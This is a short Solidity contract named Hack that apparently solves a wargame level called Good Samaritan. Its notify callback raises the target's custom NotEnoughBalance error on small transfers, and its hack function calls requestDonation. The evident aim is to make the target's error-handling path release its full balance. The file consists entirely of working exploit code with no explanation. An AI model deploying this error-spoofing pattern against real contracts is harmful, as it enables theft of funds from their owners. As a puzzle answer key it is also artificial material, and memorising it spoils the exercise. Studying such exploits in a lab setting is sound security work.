// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract Hack is INotifyable {

    error NotEnoughBalance();

    function notify(uint256 amount) external {
        // Raise a NotEnoughBalance error
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function hack(address _gsAddress) external {
        GoodSamaritan gs = GoodSamaritan(_gsAddress);
        gs.requestDonation();
    }
}
